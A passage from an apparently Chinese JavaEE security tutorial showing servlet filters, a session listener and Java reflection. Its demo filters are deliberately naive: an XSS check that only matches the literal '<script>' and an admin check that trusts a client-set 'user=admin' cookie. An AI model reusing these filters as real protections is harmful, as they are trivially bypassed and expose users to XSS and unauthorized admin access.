class="hljs-string">&quot;xss开启过滤&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//中间件关闭后就自动运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;xss销毁过滤&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//doFilter 访问路由触发的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;xss正在过滤&quot;</span>);<br>        <span class="hljs-comment">//过滤代码就应该在放行前</span><br>        <span class="hljs-comment">//如果符合就放行，不符合就过滤（拦截）</span><br>        <span class="hljs-comment">//XSS过滤 接受参数值 如果有攻击payload 就进行拦截</span><br>        <span class="hljs-comment">// 接受参数值 如果没有攻击payload 就进行放行</span><br>        HttpServletRequest request= (HttpServletRequest) servletRequest;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!code.contains(<span class="hljs-string">&quot;&lt;script&gt;&quot;</span>))&#123; <span class="hljs-comment">//没有攻击payload</span><br>            <span class="hljs-comment">//放行</span><br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;存在XSS攻击&quot;</span>);<br>            <span class="hljs-comment">//继续拦截</span><br>        &#125;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功防御</p><p>​<img src="/assets/image-20240714174422-eyckmxy.png" alt="image">​</p></li><li><p>利用过滤器简单实现：cookie身份验证</p><p>在servlet下创建AdminServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/admin&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;欢迎进入管理员页面&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<img src="/assets/image-20240714174827-dr31g3v.png" alt="image">​</p><p>在filter下创建AdminFilter，先不加入判断获取到浏览器本身的cookie值</p><p>​<img src="/assets/image-20240714175051-4apr00h.png" alt="image">​</p><p>​<img src="/assets/image-20240714175106-2zf591f.png" alt="image">​</p><p>加入cookie判断，检查请求中是否包含<strong>名为 “user” 且值为 “admin”</strong>  的Cookie。如果符合条件，则放行请求；否则，输出 “非管理员访问”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.filterdemo1.filter;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br>    <br><span class="hljs-meta">@WebFilter(&quot;/admin&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;admin身份检测开启&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;admin身份检测销毁&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>        System.out.println(<span class="hljs-string">&quot;admin身份检测进行&quot;</span>);<br>        <span class="hljs-comment">//检测Cookie过滤</span><br>        HttpServletRequest request= (HttpServletRequest) servletRequest;<br>        Cookie[] cookies=request.getCookies();<br>        <span class="hljs-comment">//对Cookie进行遍历获取</span><br>        <span class="hljs-keyword">for</span>(Cookie c:cookies)&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cName</span> <span class="hljs-operator">=</span> c.getName();<span class="hljs-comment">//获取cookie名</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cValue</span> <span class="hljs-operator">=</span> c.getValue();<span class="hljs-comment">//获取cookie值</span><br>            System.out.println(cName);<br>            System.out.println(cValue);<br>            <span class="hljs-keyword">if</span>(cName.contains(<span class="hljs-string">&quot;user&quot;</span>) &amp;&amp; cValue.contains(<span class="hljs-string">&quot;admin&quot;</span>))&#123;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;非管理员访问&quot;</span>);<br>            &#125;<br>        &#125;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在应用程序一栏添加<strong>名为 “user” 且值为 “admin”</strong>  的Cookie，成功放行请求</p><p>​<img src="/assets/image-20240714175340-1vh7fwa.png" alt="image">​</p></li></ul></li><li><p>Listener监听器</p><ol><li><p>创建监听器</p><p> <img src="/assets/image-20240714175648-trumzeb.png" alt="image">​</p><p> <img src="/assets/image-20240714180354-cs74c1e.png" alt="image">​</p><ul><li><p>在servlet下创建<code>CSession</code>​ <code>DSession</code>​，并进行检测</p><p>CSession</p><p><img src="/assets/image-20240714180211-oe0fs9t.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.listendemo1.Servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-comment">//Servlet的URL映射为 “/cs”</span><br><span class="hljs-meta">@WebServlet(&quot;/cs&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//打印一条日志，说明Servlet正在创建Session</span><br>        System.out.println(<span class="hljs-string">&quot;Servlet里面创建Session&quot;</span>);<br>        <span class="hljs-comment">//获取当前请求的HttpSession，如果不存在,则会创建一个新的Session。这通常会在应用程序需要使用会话状态时调用</span><br>        req.getSession();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>DSession</p><p><img src="/assets/image-20240714180238-pa19n34.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.listendemo1.Servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-comment">//Servlet的URL映射为 “/ds”</span><br><span class="hljs-meta">@WebServlet(&quot;/ds&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//打印一条日志，说明Servlet正在销毁Session</span><br>        System.out.println(<span class="hljs-string">&quot;Servlet里面销毁Session&quot;</span>);<br>        <span class="hljs-comment">//获取当前请求的HttpSession，并调用invalidate()方法使其失效，从而销毁Session。这通常会导致用户在当前会话中的状态丢失，因为Session被销毁了</span><br>        req.getSession().invalidate();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在listener下创建ListenSession</p><p>ListenSession</p><p><img src="/assets/image-20240714180647-36bq3rr.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.listendemo1.listener;<br><br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebListener;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSessionEvent;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSessionListener;<br><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenSession</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpSessionListener</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sessionCreated</span><span class="hljs-params">(HttpSessionEvent se)</span> &#123;<br>        <span class="hljs-comment">//监听检测有Session创建就会执行这里</span><br>        System.out.println(<span class="hljs-string">&quot;监听器监听到了session创建&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sessionDestroyed</span><span class="hljs-params">(HttpSessionEvent se)</span> &#123;<br>        <span class="hljs-comment">//监听检测有Session销毁就会执行这里</span><br>        System.out.println(<span class="hljs-string">&quot;监听器监听到了session销毁&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-反射机制-攻击链-类对象-成员变量方法-构造方法"><a href="#JavaEE应用-反射机制-攻击链-类对象-成员变量方法-构造方法" class="headerlink" title="JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法"></a>JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法</h3><ol><li><p>反射机制</p><p> 首先创建一个User类，包含成员变量和成员方法，构造方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-comment">//成员变量</span><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">private</span> String gender=<span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">protected</span> String job=<span class="hljs-string">&quot;sec&quot;</span>;<br><br><br>    <span class="hljs-comment">//构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//System.out.println(&quot;无参数&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;我的名字&quot;</span>+name);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(name);<br>        System.out.println(age);<br>    &#125;<br><br><br>    <span class="hljs-comment">//成员方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">userinfo</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age,String gender,String job)</span>&#123;<br>        <span class="hljs-built_in">this</span>.job=job;<br>        <span class="hljs-built_in">this</span>.age=age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">users</span><span class="hljs-params">(String name,String gender)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        System.out.println(<span class="hljs-string">&quot;users成员方法：&quot;</span>+name);<br>        System.out.println(<span class="hljs-string">&quot;users成员方法：&quot;</span>+gender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>反射-Class对象类获取</p><p>1、根据全限定类名：<code>Class.forName(“全路径类名”)</code>​</p><p>2、根据类名：<code>类名.class</code>​</p><p>3、根据对象：<code>对象.getClass()</code>​</p><p>4、通过类加载器获得Class对象：<code>ClassLoader.getSystemClassLoader().loadClass(“全路径类名”);</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetClass</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//1、根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>        System.out.println(aClass);<br>    <br>        <span class="hljs-comment">//2、根据类名：类名.class</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">userClass</span> <span class="hljs-operator">=</span> User.class;<br>        System.out.println(userClass);<br>    <br>        <span class="hljs-comment">//3、根据对象：对象.getClass()</span><br>        User user= <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> user.getClass();<br>        System.out.println(aClass1);<br>    <br>        <span class="hljs-comment">//4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span><br>        ClassLoader clsload=ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> clsload.loadClass(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>        System.out.println(aClass2);<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<img src="/assets/image-20240714203422-uhom2x4.png" alt="image">​</p></li><li><p>反射-Field成员变量类获取</p><p>​<img src="/assets/image-20240714203501-0xqmv1o.png" alt="image">​</p><ol><li><p>获取公共的成员变量</p><p> ​<img src="/assets/image-20240714203624-o03drfb.png" alt="image">​</p></li><li><p>获取所有的成员变量</p><p> ​<img src="/assets/image-20240714203753-6gizog5.png" alt="image">​</p><p> 剩下的同理,不再赘述</p></li><li><p>源码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFiled</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>    <br><span class="hljs-comment">//        //获取公共的成员变量</span><br><span class="hljs-comment">//        Field[] fields = aClass.getFields();</span><br><span class="hljs-comment">//        for (Field fd : fields) &#123;</span><br><span class="hljs-comment">//            System.out.println(fd);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取所有的成员变量</span><br><span class="hljs-comment">//        Field[] fields = aClass.getDeclaredFields();</span><br><span class="hljs-comment">//        for(Field fd:fields)&#123;</span><br><span class="hljs-comment">//            System.out.println(fd);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取单个的公共成员变量</span><br><span class="hljs-comment">//        Field name = aClass.getField(&quot;name&quot;);</span><br><span class="hljs-comment">//        System.out.println(name);</span><br>    <br><span class="hljs-comment">//        //获取单个的成员变量</span><br><span class="hljs-comment">//        Field gender = aClass.getDeclaredField(&quot;gender&quot;);</span><br><span class="hljs-comment">//        System.out.println(gender);</span><br>    <br><span class="hljs-comment">//        //获取公共的成员变量age的值</span><br><span class="hljs-comment">//        User u = new User();</span><br><span class="hljs-comment">//        Field field=aClass.getField(&quot;age&quot;);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //取值</span><br><span class="hljs-comment">//        Object a=field.get(u);</span><br><span class="hljs-comment">//        System.out.println(a);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //赋值</span><br><span class="hljs-comment">//        field.set(u,32);</span><br><span class="hljs-comment">//        Object aa=field.get(u);</span><br><span class="hljs-comment">//        System.out.println(aa);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li><li><p>反射-Constructor构造方法类获取</p><p>​<img src="/assets/image-20240714204114-i24yak5.png" alt="image">​</p><p>原理同上,不多赘述,,源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetConstructor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>        <span class="hljs-comment">//获取公共的构造方法</span><br><span class="hljs-comment">//        Constructor[] constructors = aClass.getConstructors();</span><br><span class="hljs-comment">//        for (Constructor con:constructors)&#123;</span><br><span class="hljs-comment">//            System.out.println(con);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br>        <span class="hljs-comment">//获取所有的构造方法</span><br><span class="hljs-comment">//        Constructor[] constructors = aClass.getDeclaredConstructors();</span><br><span class="hljs-comment">//        for (Constructor con:constructors)&#123;</span><br><span class="hljs-comment">//            System.out.println(con);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br>        <span class="hljs-comment">//获取单个的公共的构造方法</span><br><span class="hljs-comment">//        Constructor constructor = aClass.getConstructor(String.class);</span><br><span class="hljs-comment">//        System.out.println(constructor);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //获取单个的构造方法</span><br><span class="hljs-comment">//        Constructor con1 = aClass.getDeclaredConstructor(String.class,int.class);</span><br><span class="hljs-comment">//        System.out.println(con1);</span><br><br><br>        <span class="hljs-comment">//对构造方法进行操作(两个参数string，int)</span><br><span class="hljs-comment">//        Constructor con2=aClass.getDeclaredConstructor(String.class,int.class);</span><br><span class="hljs-comment">//        //临时开启对私有的访问</span><br><span class="hljs-comment">//        con2.setAccessible(true);</span><br><span class="hljs-comment">//        User uu=(User) con2.newInstance(&quot;xiaodigaygay&quot;,40);</span><br>        <span class="hljs-comment">//System.out.println(uu);</span><br>    <br>        <span class="hljs-comment">//对构造方法进行执行(1个参数strin)</span><br><span class="hljs-comment">//        Constructor con2=aClass.getConstructor(String.class);</span><br><span class="hljs-comment">//        con2.newInstance(&quot;xiaodigaygay&quot;);</span><br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>反射-Method成员方法类获取</p><p>​<img src="/assets/image-20240714205642-k9hjnp4.png" alt="image">​</p><p>同……源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br><span class="hljs-comment">//        //获取包括继承的公共成员方法</span><br><span class="hljs-comment">//        Method[] methods = aClass.getMethods();</span><br><span class="hljs-comment">//        for(Method me:methods)&#123;</span><br><span class="hljs-comment">//            System.out.println(me);</span><br><span class="hljs-comment">//        